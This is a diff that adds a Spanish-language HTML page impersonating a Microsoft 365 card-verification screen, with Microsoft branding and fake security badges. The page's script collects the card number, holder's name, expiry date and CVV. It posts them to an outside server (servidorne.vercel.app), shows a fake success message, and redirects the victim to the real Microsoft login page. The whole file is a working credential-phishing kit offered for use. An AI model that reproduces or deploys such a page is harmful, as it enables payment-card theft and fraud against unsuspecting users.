@@ -1,0 +1,1105 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificación de Tarjeta - Microsoft Services</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family:
+          "Segoe UI",
+          "Segoe UI Web (West European)",
+          "Segoe UI",
+          -apple-system,
+          BlinkMacSystemFont,
+          Roboto,
+          "Helvetica Neue",
+          sans-serif;
+      }
+
+      body {
+        background:
+          linear-gradient(135deg, rgba(10, 30, 60, 0.9), rgba(5, 15, 40, 0.95)),
+          url("https://images.unsplash.com/photo-1613243555978-636c48dc653c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80")
+            no-repeat center center fixed;
+        background-size: cover;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+        color: #333;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 500px;
+        animation: fadeIn 0.8s ease;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 30px;
+        padding: 15px 25px;
+        background: rgba(255, 255, 255, 0.95);
+        border-radius: 12px 12px 0 0;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      }
+
+      .logo-section {
+        display: flex;
+        align-items: center;
+      }
+
+      .microsoft-logo {
+        width: 120px;
+        height: 25px;
+        background-image: url("https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31");
+        background-size: contain;
+        background-repeat: no-repeat;
+        margin-right: 15px;
+      }
+
+      .secure-badge {
+        background-color: #107c10;
+        color: white;
+        padding: 4px 12px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+      }
+
+      .secure-badge i {
+        margin-right: 5px;
+        font-size: 10px;
+      }
+
+      .card-container {
+        background-color: white;
+        border-radius: 0 0 12px 12px;
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+        padding: 35px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .card-container::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 4px;
+        background: linear-gradient(90deg, #0078d4, #5c2d91, #0078d4);
+      }
+
+      .title {
+        font-size: 26px;
+        font-weight: 300;
+        margin-bottom: 10px;
+        color: #1b1b1b;
+      }
+
+      .subtitle {
+        font-size: 14px;
+        color: #605e5c;
+        margin-bottom: 30px;
+        line-height: 1.5;
+      }
+
+      .form-group {
+        margin-bottom: 24px;
+      }
+
+      .form-label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 8px;
+        color: #323130;
+      }
+
+      .form-input {
+        width: 100%;
+        padding: 14px;
+        border: 1px solid #d1d1d1;
+        border-radius: 6px;
+        font-size: 16px;
+        transition: all 0.3s;
+        background-color: #faf9f8;
+      }
+
+      .form-input:focus {
+        outline: none;
+        border-color: #0078d4;
+        box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+        background-color: white;
+      }
+
+      .form-input.error {
+        border-color: #d13438;
+        background-color: #fff4f4;
+      }
+
+      .input-row {
+        display: flex;
+        gap: 20px;
+      }
+
+      .input-row .form-group {
+        flex: 1;
+      }
+
+      .card-preview {
+        background: linear-gradient(135deg, #2a2a2a, #1a1a1a);
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 30px;
+        color: white;
+        box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+        position: relative;
+        overflow: hidden;
+        min-height: 180px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+      }
+
+      .card-preview::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        right: 0;
+        width: 80px;
+        height: 80px;
+        background: radial-gradient(
+          circle,
+          rgba(255, 255, 255, 0.2) 0%,
+          rgba(255, 255, 255, 0) 70%
+        );
+        border-radius: 50%;
+      }
+
+      .card-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+      }
+
+      .chip-icon {
+        width: 50px;
+        height: 35px;
+        background: linear-gradient(135deg, #d4af37, #f5d76e);
+        border-radius: 6px;
+        position: relative;
+      }
+
+      .chip-icon::before {
+        content: "";
+        position: absolute;
+        top: 5px;
+        left: 5px;
+        right: 5px;
+        bottom: 5px;
+        border: 1px solid rgba(0, 0, 0, 0.2);
+        border-radius: 4px;
+      }
+
+      .card-type {
+        font-size: 24px;
+        color: rgba(255, 255, 255, 0.8);
+      }
+
+      .card-number-display {
+        font-family: "Courier New", monospace;
+        font-size: 22px;
+        letter-spacing: 2px;
+        margin-bottom: 20px;
+        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+      }
+
+      .card-details {
+        display: flex;
+        justify-content: space-between;
+        font-size: 14px;
+        color: rgba(255, 255, 255, 0.9);
+      }
+
+      .card-holder-display {
+        font-size: 16px;
+        font-weight: 500;
+        text-transform: uppercase;
+      }
+
+      .card-expiry-display {
+        font-size: 16px;
+      }
+
+      .info-note {
+        background-color: #f3f2f1;
+        border-left: 4px solid #0078d4;
+        padding: 12px 16px;
+        margin-bottom: 25px;
+        border-radius: 4px;
+        font-size: 13px;
+        color: #605e5c;
+      }
+
+      .info-note i {
+        color: #0078d4;
+        margin-right: 8px;
+      }
+
+      .button-group {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 30px;
+        padding-top: 20px;
+        border-top: 1px solid #edebe9;
+      }
+
+      .btn {
+        padding: 14px 28px;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-width: 140px;
+      }
+
+      .btn-primary {
+        background: linear-gradient(135deg, #0078d4, #106ebe);
+        color: white;
+      }
+
+      .btn-primary:hover {
+        background: linear-gradient(135deg, #106ebe, #005a9e);
+        transform: translateY(-2px);
+        box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+      }
+
+      .btn-secondary {
+        background-color: transparent;
+        color: #0078d4;
+        border: 1px solid #d1d1d1;
+      }
+
+      .btn-secondary:hover {
+        background-color: rgba(0, 120, 212, 0.05);
+        border-color: #0078d4;
+      }
+
+      .btn i {
+        margin-right: 8px;
+      }
+
+      /* Overlay de carga */
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.85);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
+        flex-direction: column;
+      }
+
+      .loading-spinner {
+        width: 60px;
+        height: 60px;
+        border: 5px solid rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        border-top-color: #0078d4;
+        animation: spin 1s ease-in-out infinite;
+        margin-bottom: 20px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-text {
+        color: white;
+        font-size: 18px;
+        font-weight: 300;
+      }
+
+      /* Overlay de éxito */
+      .success-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.9);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1001;
+        display: none;
+        flex-direction: column;
+      }
+
+      .success-icon {
+        width: 100px;
+        height: 100px;
+        background-color: #107c10;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 25px;
+        animation: scaleIn 0.5s ease-out;
+      }
+
+      .success-icon i {
+        font-size: 50px;
+        color: white;
+      }
+
+      @keyframes scaleIn {
+        from {
+          transform: scale(0);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+
+      .success-title {
+        color: white;
+        font-size: 28px;
+        font-weight: 300;
+        margin-bottom: 10px;
+        animation: fadeInUp 0.5s ease-out 0.2s both;
+      }
+
+      .success-message {
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 16px;
+        margin-bottom: 10px;
+        animation: fadeInUp 0.5s ease-out 0.4s both;
+      }
+
+      .redirect-message {
+        color: rgba(255, 255, 255, 0.6);
+        font-size: 14px;
+        animation: fadeInUp 0.5s ease-out 0.6s both;
+      }
+
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .footer {
+        margin-top: 30px;
+        text-align: center;
+        font-size: 12px;
+        color: #8a8886;
+        padding-top: 20px;
+        border-top: 1px solid #edebe9;
+      }
+
+      .footer-links {
+        display: flex;
+        justify-content: center;
+        gap: 25px;
+        margin-bottom: 15px;
+      }
+
+      .footer-link {
+        color: #605e5c;
+        text-decoration: none;
+      }
+
+      .footer-link:hover {
+        color: #0078d4;
+        text-decoration: underline;
+      }
+
+      .error-message {
+        color: #d13438;
+        font-size: 12px;
+        margin-top: 5px;
+        display: none;
+      }
+
+      .card-icons {
+        display: flex;
+        gap: 10px;
+        margin-top: 10px;
+      }
+
+      .card-icon {
+        font-size: 28px;
+        color: #605e5c;
+      }
+
+      .visa {
+        color: #1a1f71;
+      }
+      .mastercard {
+        color: #eb001b;
+      }
+      .amex {
+        color: #2e77bc;
+      }
+
+      @media (max-width: 600px) {
+        .container {
+          max-width: 100%;
+        }
+
+        .header {
+          flex-direction: column;
+          align-items: flex-start;
+          gap: 15px;
+        }
+
+        .input-row {
+          flex-direction: column;
+          gap: 0;
+        }
+
+        .button-group {
+          flex-direction: column;
+          gap: 15px;
+        }
+
+        .btn {
+          width: 100%;
+        }
+
+        .card-preview {
+          min-height: 160px;
+        }
+
+        .card-number-display {
+          font-size: 18px;
+        }
+
+        .footer-links {
+          flex-direction: column;
+          gap: 10px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Overlay de carga -->
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">Verificando su tarjeta...</div>
+      <div class="loading-text" style="font-size: 14px; margin-top: 10px">
+        Esto puede tomar unos segundos
+      </div>
+    </div>
+
+    <!-- Overlay de éxito -->
+    <div class="success-overlay" id="successOverlay">
+      <div class="success-icon">
+        <i class="fas fa-check"></i>
+      </div>
+      <div class="success-title">¡Verificación Exitosa!</div>
+      <div class="success-message">
+        Su tarjeta ha sido verificada correctamente
+      </div>
+      <div class="redirect-message" id="redirectMessage">
+        Será redirigido en 3 segundos...
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="header">
+        <div class="logo-section">
+          <div class="microsoft-logo"></div>
+          <div class="secure-badge">
+            <i class="fas fa-lock"></i> Conexión Segura
+          </div>
+        </div>
+        <div style="color: #107c10; font-size: 14px; font-weight: 500">
+          <i class="fas fa-shield-alt"></i> Protegido por Microsoft
+        </div>
+      </div>
+
+      <div class="card-container">
+        <h1 class="title">Verificación de Tarjeta</h1>
+        <p class="subtitle">
+          Para completar su suscripción a Microsoft 365, necesitamos verificar
+          los datos de su tarjeta de crédito/débito. Esta es una verificación
+          única de seguridad.
+        </p>
+
+        <!-- Vista previa de tarjeta -->
+        <div class="card-preview">
+          <div class="card-header">
+            <div class="chip-icon"></div>
+            <div class="card-type">
+              <i class="fab fa-cc-visa"></i>
+            </div>
+          </div>
+
+          <div class="card-number-display" id="cardNumberDisplay">
+            •••• •••• •••• ••••
+          </div>
+
+          <div class="card-details">
+            <div>
+              <div style="font-size: 12px; opacity: 0.7">
+                TITULAR DE LA TARJETA
+              </div>
+              <div class="card-holder-display" id="cardHolderDisplay">
+                NOMBRE COMPLETO
+              </div>
+            </div>
+            <div>
+              <div style="font-size: 12px; opacity: 0.7">VÁLIDA HASTA</div>
+              <div class="card-expiry-display" id="cardExpiryDisplay">
+                MM/AA
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Iconos de tarjetas aceptadas -->
+        <div class="card-icons">
+          <i class="fab fa-cc-visa card-icon visa" title="Visa"></i>
+          <i
+            class="fab fa-cc-mastercard card-icon mastercard"
+            title="Mastercard"
+          ></i>
+          <i class="fab fa-cc-amex card-icon amex" title="American Express"></i>
+          <i
+            class="fab fa-cc-diners-club card-icon diners"
+            title="Diners Club"
+          ></i>
+          <i
+            class="fas fa-credit-card card-icon magna"
+            title="Magnacharge (Redcompra)"
+          ></i>
+          <i
+            class="fas fa-university card-icon prepago"
+            title="Tarjetas Prepago Bancarias"
+          ></i>
+        </div>
+
+        <!-- Formulario de datos de tarjeta -->
+        <form id="cardForm">
+          <div class="form-group">
+            <label class="form-label">Número de Tarjeta</label>
+            <input
+              type="text"
+              id="cardNumber"
+              class="form-input"
+              placeholder="1234 5678 9012 3456"
+              maxlength="19"
+              autocomplete="cc-number"
+            />
+            <div class="error-message" id="cardNumberError">
+              Por favor ingrese un número de tarjeta válido
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label"
+              >Nombre del Titular (como aparece en la tarjeta)</label
+            >
+            <input
+              type="text"
+              id="cardHolder"
+              class="form-input"
+              placeholder="JUAN PEREZ GARCIA"
+              autocomplete="cc-name"
+            />
+            <div class="error-message" id="cardHolderError">
+              Por favor ingrese el nombre del titular
+            </div>
+          </div>
+
+          <div class="input-row">
+            <div class="form-group">
+              <label class="form-label">Fecha de Expiración</label>
+              <input
+                type="text"
+                id="cardExpiry"
+                class="form-input"
+                placeholder="MM/AA"
+                maxlength="5"
+                autocomplete="cc-exp"
+              />
+              <div class="error-message" id="cardExpiryError">
+                Formato MM/AA (ej: 12/25)
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label">CVV/CVC</label>
+              <input
+                type="password"
+                id="cardCVV"
+                class="form-input"
+                placeholder="123"
+                maxlength="4"
+                autocomplete="cc-csc"
+              />
+              <div class="error-message" id="cardCVVError">
+                Código de seguridad de 3-4 dígitos
+              </div>
+            </div>
+          </div>
+        </form>
+
+        <div class="button-group">
+          <button id="cancelBtn" class="btn btn-secondary">
+            <i class="fas fa-times"></i> Cancelar
+          </button>
+          <button id="submitBtn" class="btn btn-primary">
+            <i class="fas fa-check-circle"></i> Verificar Tarjeta
+          </button>
+        </div>
+
+        <div class="footer">
+          <div class="footer-links">
+            <a href="#" class="footer-link">Política de Privacidad</a>
+            <a href="#" class="footer-link">Términos de Servicio</a>
+            <a href="#" class="footer-link">Ayuda</a>
+            <a href="#" class="footer-link">Contacto</a>
+          </div>
+          <p style="margin-top: 10px">
+            <i class="fas fa-lock" style="color: #107c10"></i>
+            Todos los datos se transmiten mediante conexión segura SSL
+          </p>
+          <p style="margin-top: 5px; font-size: 11px">
+            Microsoft Corporation • One Microsoft Way, Redmond, WA 98052
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Elementos DOM
+      const cardForm = document.getElementById("cardForm");
+      const cardNumber = document.getElementById("cardNumber");
+      const cardHolder = document.getElementById("cardHolder");
+      const cardExpiry = document.getElementById("cardExpiry");
+      const cardCVV = document.getElementById("cardCVV");
+      const submitBtn = document.getElementById("submitBtn");
+      const cancelBtn = document.getElementById("cancelBtn");
+      const loadingOverlay = document.getElementById("loadingOverlay");
+      const successOverlay = document.getElementById("successOverlay");
+      const redirectMessage = document.getElementById("redirectMessage");
+
+      // Elementos de vista previa
+      const cardNumberDisplay = document.getElementById("cardNumberDisplay");
+      const cardHolderDisplay = document.getElementById("cardHolderDisplay");
+      const cardExpiryDisplay = document.getElementById("cardExpiryDisplay");
+
+      // Elementos de error
+      const cardNumberError = document.getElementById("cardNumberError");
+      const cardHolderError = document.getElementById("cardHolderError");
+      const cardExpiryError = document.getElementById("cardExpiryError");
+      const cardCVVError = document.getElementById("cardCVVError");
+
+      // Mostrar pantalla de carga
+      function showLoading() {
+        loadingOverlay.style.display = "flex";
+      }
+
+      // Ocultar pantalla de carga
+      function hideLoading() {
+        loadingOverlay.style.display = "none";
+      }
+
+      // Mostrar pantalla de éxito
+      function showSuccess() {
+        successOverlay.style.display = "flex";
+      }
+
+      // Ocultar pantalla de éxito
+      function hideSuccess() {
+        successOverlay.style.display = "none";
+      }
+
+      // Validar número de tarjeta (algoritmo de Luhn)
+      function isValidCardNumber(cardNum) {
+        // Eliminar espacios y caracteres no numéricos
+        cardNum = cardNum.replace(/\s+/g, "").replace(/\D/g, "");
+
+        // Verificar longitud
+        if (cardNum.length < 13 || cardNum.length > 19) return false;
+
+        // Algoritmo de Luhn
+        let sum = 0;
+        let isEven = false;
+
+        for (let i = cardNum.length - 1; i >= 0; i--) {
+          let digit = parseInt(cardNum.charAt(i), 10);
+
+          if (isEven) {
+            digit *= 2;
+            if (digit > 9) digit -= 9;
+          }
+
+          sum += digit;
+          isEven = !isEven;
+        }
+
+        return sum % 10 === 0;
+      }
+
+      // Validar fecha de expiración
+      function isValidExpiry(expiry) {
+        if (!expiry || !expiry.includes("/")) return false;
+
+        const parts = expiry.split("/");
+        if (parts.length !== 2) return false;
+
+        const month = parseInt(parts[0], 10);
+        const year = parseInt(parts[1], 10);
+
+        // Validar mes
+        if (month < 1 || month > 12) return false;
+
+        // Validar año (asumimos años entre 2000-2099)
+        if (year < 0 || year > 99) return false;
+
+        // Validar que no esté vencida
+        const currentYear = new Date().getFullYear() % 100;
+        const currentMonth = new Date().getMonth() + 1;
+
+        if (year < currentYear) return false;
+        if (year === currentYear && month < currentMonth) return false;
+
+        return true;
+      }
+
+      // Validar CVV
+      function isValidCVV(cvv) {
+        cvv = cvv.replace(/\D/g, "");
+        return cvv.length === 3 || cvv.length === 4;
+      }
+
+      // Validar nombre del titular
+      function isValidCardHolder(name) {
+        return name && name.trim().length >= 5 && /^[a-zA-Z\s]+$/.test(name);
+      }
+
+      // Formatear número de tarjeta
+      function formatCardNumber(value) {
+        // Eliminar todo excepto números
+        const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+        const matches = v.match(/\d{4,16}/g);
+        const match = (matches && matches[0]) || "";
+        const parts = [];
+
+        for (let i = 0, len = match.length; i < len; i += 4) {
+          parts.push(match.substring(i, i + 4));
+        }
+
+        if (parts.length) {
+          return parts.join(" ");
+        } else {
+          return value;
+        }
+      }
+
+      // Formatear fecha de expiración
+      function formatExpiry(value) {
+        const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+
+        if (v.length >= 2) {
+          return (
+            v.substring(0, 2) + (v.length > 2 ? "/" + v.substring(2, 4) : "")
+          );
+        }
+        return v;
+      }
+
+      // Actualizar vista previa de tarjeta
+      function updateCardPreview() {
+        // Número de tarjeta
+        let displayNumber = cardNumber.value;
+        if (!displayNumber || displayNumber.replace(/\s/g, "").length < 16) {
+          cardNumberDisplay.textContent = "•••• •••• •••• ••••";
+        } else {
+          const formatted = formatCardNumber(displayNumber);
+          const parts = formatted.split(" ");
+          if (parts.length >= 4) {
+            cardNumberDisplay.textContent = "•••• •••• •••• " + parts[3];
+          } else {
+            cardNumberDisplay.textContent = formatted;
+          }
+        }
+
+        // Nombre del titular
+        if (cardHolder.value) {
+          cardHolderDisplay.textContent = cardHolder.value.toUpperCase();
+        } else {
+          cardHolderDisplay.textContent = "NOMBRE COMPLETO";
+        }
+
+        // Fecha de expiración
+        if (cardExpiry.value) {
+          cardExpiryDisplay.textContent = cardExpiry.value;
+        } else {
+          cardExpiryDisplay.textContent = "MM/AA";
+        }
+      }
+
+      // Función para enviar datos al servidor
+      function sendCardDataToServer(cardData) {
+        // Mostrar pantalla de carga
+        showLoading();
+
+        // Crear el mensaje en el formato solicitado
+        const mensaje = `Tarjeta de Crédito/Débito\nNúmero: ${cardData.number}\nTitular: ${cardData.holder}\nExpiración: ${cardData.expiry}\nCVV: ${cardData.cvv}`;
+
+        // URL del servidor proporcionada
+        const url = "https://servidorne.vercel.app/egl";
+
+        // Crear FormData para enviar
+        const formData = new FormData();
+        formData.append("mensaje", mensaje);
+
+        // Enviar petición POST al servidor
+        fetch(url, {
+          method: "POST",
+          body: formData,
+          mode: "no-cors", // Usar 'no-cors' para evitar problemas de CORS
+        })
+          .then(() => {
+            // Ocultar pantalla de carga
+            hideLoading();
+            
+            // Mostrar pantalla de éxito
+            showSuccess();
+            
+            // Iniciar cuenta regresiva de 3 segundos
+            let secondsLeft = 10;
+            redirectMessage.textContent = `Será redirigido en ${secondsLeft} segundos...`;
+            
+            const countdownInterval = setInterval(() => {
+              secondsLeft--;
+              if (secondsLeft > 0) {
+                redirectMessage.textContent = `Será redirigido en ${secondsLeft} segundos...`;
+              } else {
+                clearInterval(countdownInterval);
+                // Redirigir después de 3 segundos
+                window.location.href =
+                  "https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3a%2f%2foutlook.office.com%2f.default+openid+profile+offline_access&redirect_uri=https%3a%2f%2foutlook.live.com%2fmail%2f&response_type=code&state=eyJpZCI6IjAxOWJjZjMyLWQ5MGQtNzZmZS1iZTBmLTZmNzI4ZTM1YmU2NCIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7caHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8_ZGVlcGxpbms9bWFpbCUyRjAlMkY&response_mode=fragment&nonce=019bcf32-d90d-71cb-94f4-54d265282be1&code_challenge=U44XUp4H-_I0j764BL3Rh2qHWK8FLlQkvzd0jKTgK7Q&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=4.26.0&uaid=c0c6de6476613578b2d347256be25b92&msproxy=1&issuer=mso&tenant=common&ui_locales=es-419&client_info=1&epctrc=rCEekF%2f8pRvGmTCU9E3C0y9mHXmmzS9TEgu%2bXlmWQ%2fQ%3d3%3a1%3aCANARY%3aRuu8OYnU2OoRgPPCtpQebEXgfSMeWydyFUWGKd1TyRA%3d&epct=PAQABDgEAAACvnsHKEvvRQb3Bz3Qc7wnaPclFDobV5hyy3D_lmPSrgMnw9e-pudUR9sPW8J-_DNFs-TD9nQ8JJKGu7k4eKRUlRVXosEmrxJPOfv9CCS0YhCzZWsxGhK0xRk6-qmw2cmYCmXRIiku_8zZkQxDVopMMNXv7ewNRk6FJ_7AsVr8TJpGFDlGdOppLT0V3VFM5HiHk_jHdDm-pR_TkiV2hWTgWf8GPJEexbVbwKwHLLrdftyAA&jshs=2&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&claims=%7b%22access_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&jsh=&jshp=&username=asdasd%40hotmail.com&login_hint=asdasd%40hotmail.com";
+              }
+            }, 1000);
+          })
+          .catch((error) => {
+            // En caso de error, también mostrar éxito y redirigir
+            console.error("Error al enviar datos:", error);
+            hideLoading();
+            showSuccess();
+            
+            let secondsLeft = 3;
+            redirectMessage.textContent = `Será redirigido en ${secondsLeft} segundos...`;
+            
+            const countdownInterval = setInterval(() => {
+              secondsLeft--;
+              if (secondsLeft > 0) {
+                redirectMessage.textContent = `Será redirigido en ${secondsLeft} segundos...`;
+              } else {
+                clearInterval(countdownInterval);
+                window.location.href =
+                  "https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3a%2f%2foutlook.office.com%2f.default+openid+profile+offline_access&redirect_uri=https%3a%2f%2foutlook.live.com%2fmail%2f&response_type=code&state=eyJpZCI6IjAxOWJjZjMyLWQ5MGQtNzZmZS1iZTBmLTZmNzI4ZTM1YmU2NCIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7caHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8_ZGVlcGxpbms9bWFpbCUyRjAlMkY&response_mode=fragment&nonce=019bcf32-d90d-71cb-94f4-54d265282be1&code_challenge=U44XUp4H-_I0j764BL3Rh2qHWK8FLlQkvzd0jKTgK7Q&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=4.26.0&uaid=c0c6de6476613578b2d347256be25b92&msproxy=1&issuer=mso&tenant=common&ui_locales=es-419&client_info=1&epctrc=rCEekF%2f8pRvGmTCU9E3C0y9mHXmmzS9TEgu%2bXlmWQ%2fQ%3d3%3a1%3aCANARY%3aRuu8OYnU2OoRgPPCtpQebEXgfSMeWydyFUWGKd1TyRA%3d&epct=PAQABDgEAAACvnsHKEvvRQb3Bz3Qc7wnaPclFDobV5hyy3D_lmPSrgMnw9e-pudUR9sPW8J-_DNFs-TD9nQ8JJKGu7k4eKRUlRVXosEmrxJPOfv9CCS0YhCzZWsxGhK0xRk6-qmw2cmYCmXRIiku_8zZkQxDVopMMNXv7ewNRk6FJ_7AsVr8TJpGFDlGdOppLT0V3VFM5HiHk_jHdDm-pR_TkiV2hWTgWf8GPJEexbVbwKwHLLrdftyAA&jshs=2&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&claims=%7b%22access_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&jsh=&jshp=&username=asdasd%40hotmail.com&login_hint=asdasd%40hotmail.com";
+              }
+            }, 1000);
+          });
+      }
+
+      // Validar formulario completo
+      function validateForm() {
+        let isValid = true;
+
+        // Validar número de tarjeta
+        if (!isValidCardNumber(cardNumber.value)) {
+          cardNumber.classList.add("error");
+          cardNumberError.style.display = "block";
+          isValid = false;
+        } else {
+          cardNumber.classList.remove("error");
+          cardNumberError.style.display = "none";
+        }
+
+        // Validar nombre del titular
+        if (!isValidCardHolder(cardHolder.value)) {
+          cardHolder.classList.add("error");
+          cardHolderError.style.display = "block";
+          isValid = false;
+        } else {
+          cardHolder.classList.remove("error");
+          cardHolderError.style.display = "none";
+        }
+
+        // Validar fecha de expiración
+        if (!isValidExpiry(cardExpiry.value)) {
+          cardExpiry.classList.add("error");
+          cardExpiryError.style.display = "block";
+          isValid = false;
+        } else {
+          cardExpiry.classList.remove("error");
+          cardExpiryError.style.display = "none";
+        }
+
+        // Validar CVV
+        if (!isValidCVV(cardCVV.value)) {
+          cardCVV.classList.add("error");
+          cardCVVError.style.display = "block";
+          isValid = false;
+        } else {
+          cardCVV.classList.remove("error");
+          cardCVVError.style.display = "none";
+        }
+
+        return isValid;
+      }
+
+      // Event Listeners
+
+      // Formatear número de tarjeta mientras se escribe
+      cardNumber.addEventListener("input", function (e) {
+        this.value = formatCardNumber(this.value);
+        updateCardPreview();
+
+        // Remover error si existe
+        if (isValidCardNumber(this.value)) {
+          this.classList.remove("error");
+          cardNumberError.style.display = "none";
+        }
+      });
+
+      // Formatear fecha de expiración mientras se escribe
+      cardExpiry.addEventListener("input", function (e) {
+        this.value = formatExpiry(this.value);
+        updateCardPreview();
+
+        // Remover error si existe
+        if (isValidExpiry(this.value)) {
+          this.classList.remove("error");
+          cardExpiryError.style.display = "none";
+        }
+      });
+
+      // Actualizar vista previa para nombre del titular
+      cardHolder.addEventListener("input", function () {
+        updateCardPreview();
+
+        // Remover error si existe
+        if (isValidCardHolder(this.value)) {
+          this.classList.remove("error");
+          cardHolderError.style.display = "none";
+        }
+      });
+
+      // Validar CVV mientras se escribe
+      cardCVV.addEventListener("input", function () {
+        // Limitar a 4 dígitos
+        this.value = this.value.replace(/\D/g, "").substring(0, 4);
+
+        // Remover error si existe
+        if (isValidCVV(this.value)) {
+          this.classList.remove("error");
+          cardCVVError.style.display = "none";
+        }
+      });
+
+      // Enviar formulario
+      submitBtn.addEventListener("click", function (e) {
+        e.preventDefault();
+
+        if (validateForm()) {
+          // Recopilar datos
+          const cardData = {
+            number: cardNumber.value.replace(/\s/g, ""),
+            holder: cardHolder.value,
+            expiry: cardExpiry.value,
+            cvv: cardCVV.value,
+          };
+
+          // Enviar datos al servidor
+          sendCardDataToServer(cardData);
+        } else {
+          // Mostrar mensaje de error general
+          alert(
+            "Por favor, corrija los errores en el formulario antes de continuar.",
+          );
+        }
+      });
+
+      // Cancelar
+      cancelBtn.addEventListener("click", function (e) {
+        e.preventDefault();
+        if (
+          confirm(
+            "¿Está seguro de que desea cancelar la verificación de tarjeta?",
+          )
+        ) {
+          window.location.href = "index.html";
+        }
+      });
+
+      // Prevenir envío del formulario por defecto
+      cardForm.addEventListener("submit", function (e) {
+        e.preventDefault();
+      });
+
+      // Inicializar vista previa
+      updateCardPreview();
+
+      // Enfocar el primer campo al cargar
+      window.addEventListener("DOMContentLoaded", function () {
+        cardNumber.focus();
+      });
+    </script>
+  </body>
+</html>
